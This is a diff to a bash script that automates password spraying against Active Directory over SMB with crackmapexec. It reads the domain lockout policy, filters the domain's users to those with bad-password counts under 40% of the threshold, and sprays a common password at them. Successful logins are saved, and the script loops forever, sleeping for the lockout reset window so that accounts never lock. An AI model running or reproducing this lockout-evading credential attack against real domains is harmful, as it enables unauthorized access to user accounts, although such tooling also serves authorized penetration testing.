@@ -19,18 +19,23 @@ get_all_users() {
 }
 
 get_users_with_suitable_badpwdtime() {
-	cat /tmp/users.txt | grep -Eiw "badpwdcount: [0-$abc]" | awk '{print $5}' | cut -d '\' -f2 | tee /tmp/all_suitable_users.txt
+	tail /tmp/users.txt -n +4 | awk -v safe_badpwdcount="$safe_badpwdcount" '{if($7 < safe_badpwdcount) print $5}' | cut -d '\' -f2  | tee /tmp/all_suitable_users.txt
 }
 
 start_brute_with_suitable_users() {
-	crackmapexec smb $ip -u /tmp/all_suitable_users.txt -p P@ssw0rd --continue-on-success | tee /tmp/spray_result.txt
+	crackmapexec smb $ip -u /tmp/all_suitable_users.txt -p P@ssw0rd123 --continue-on-success | tee /tmp/spray_result.txt
+	cat /tmp/spray_result.txt | grep "+" > /tmp/success_spray.txt
 }
 
 get_domain_password_policy() {
 	crackmapexec smb $ip -u $username -p $password --pass-pol | tee /tmp/pass_policy
 	account_lockout_threshold=$(cat /tmp/pass_policy | grep "Account Lockout Threshold:" | awk -F ':' '{print $2}')
+	reset_account_lockout_counter=$(cat /tmp/pass_policy | grep "Reset Account Lockout Counter:" | cut -d ':' -f2 | cut -d ' ' -f2)
 	b=0.4 # 0.4 = 40%
-	safe_badpwdtime=$(echo "$account_lockout_threshold $b" | awk '{print $1 * $2}')
+	safe_badpwdcount=$(echo "$account_lockout_threshold $b" | awk '{print $1 * $2}')
+	reset_account_lockout_counter="${reset_account_lockout_counter}m" # TODO: Minutes, Hours....
+	echo "safe_badpwdcount, $safe_badpwdcount"
+	echo "reset_account_lockout_counter, $reset_account_lockout_counter"
 }
 
 get_args() {
@@ -45,10 +50,15 @@ get_args() {
 start() {
 	get_args $1 $2 $3
 	check_for_crackmapexec
-	get_domain_password_policy
-	get_all_users
-	get_users_with_suitable_badpwdtime
-	start_brute_with_suitable_users
+	
+	while true
+	do
+		get_domain_password_policy
+		get_all_users
+		get_users_with_suitable_badpwdtime
+		start_brute_with_suitable_users
+		sleep $reset_account_lockout_counter
+	done
 }
 
 commandline_args=("$@")
